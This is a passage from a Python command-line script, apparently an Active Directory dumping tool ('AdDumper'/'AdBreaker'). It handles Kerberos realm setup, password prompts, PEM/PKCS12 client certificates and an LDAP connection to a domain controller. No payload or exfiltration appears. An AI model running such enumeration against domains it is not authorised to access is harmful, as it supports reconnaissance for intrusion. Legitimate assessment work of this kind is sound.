    auth_arg_group.add_argument('-realm', type=str,  default=None, help='Manually specify a realm for your Kerberos ticket if you cannot resolve it from DNS')
    auth_arg_group.add_argument('-dc-ip', type=str,  default=None, help='Manually specify IP address of the domain controller for Kerberos ticket')

    output_arg_group = parser.add_argument_group('Output')
    output_arg_group.add_argument('-output', type=str,  help='Output filename. An automatically generated name will be used if not provided.')
    output_arg_group.add_argument('-loglevel', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='WARNING', help='Set logging level')
    output_arg_group.add_argument('-exclude-raw', action='store_true', help='Exclude raw binary field data from output')

    interface_arg_group = parser.add_argument_group('Interface')
    igroup = interface_arg_group.add_mutually_exclusive_group()
    igroup.add_argument('-i', '--interactive', action='store_true', default=False, help='Interactive interface')
    igroup.add_argument('-c', '--command_line', action='store_true', default=True, help='Command line')



    args = parser.parse_args()
    logger = utils.create_logger(args.loglevel, 'AdDumper')
    k_temp_file = None


    if args.realm:
        dc = args.dc_ip if args.dc_ip else args.target_ip if args.target_ip else args.domain_controller
        k_temp_file = utils.create_kerberos_config(args.realm, dc)
        logger.debug('Writing temporary "KRB5_CONFIG" file "{}" to configure: Realm: {}, KDC: {}'.format(k_temp_file, args.realm, dc))

    password = args.password
    if args.username and not args.password and not args.no_password:
        print('Please enter the password for {}:'.format(args.username))
        password = getpass.getpass()
    if args.username and args.no_password:
        if not '\\' in args.username:
            print('No password not supported for SIMPLE binds, please specify username in DOMAIN\\username format to use NTLM')
            sys.exit()

    if args.query_config:
        try:
            query_config = json.load(open(args.query_config))
        except Exception as e:
            print('Query config file {} could not be opened with error: {}'.format(args.query_config, e.msg))
    else:
        query_config = None

    client_cert = None 
    client_key = None

    if args.pem_client_cert:
        if args.pkcs12_client_cert:
            raise Exception('Cannot use PEM client certificates and pkcs12 certificates for the same operation')
        if args.pem_client_key:
            client_cert = args.pem_client_cert
            client_key = args.pem_client_key
        else:
            raise Exception('Cannot use a client PEM certificate without a key')

    if args.pkcs12_client_cert:
        client_cert_file,  client_key_file = utils.create_temporary_cert_files(args.pkcs12_client_cert)
        client_cert = client_cert_file.name 
        client_key = client_key_file.name
        logger.info(f'Writing temporary PEM certificate and key files from PKCS12 conversion to {client_cert} and {client_key}')


        
    ad = AdBreaker(args.domain_controller, target_ip=args.target_ip, username=args.username, password=password, ssl=args.ssl, port=args.port,  
                        logger=logger, kerberos=args.kerberos, no_password=args.no_password,
                        sslprotocol=args.ssl_protocol, start_tls=args.start_tls, client_cert_file=client_cert, client_key_file=client_key)

    ad.connect()
    if args.interactive:
        print('Python interactive shell, object is "ad", q to exit')
        ipdb.set_trace() 
    else:
        pass



if __name__ == "__main__":
    # execute only if run as a script, helpful if script needs to be debugged
    
    if not utils.check_ipython():
        command_line()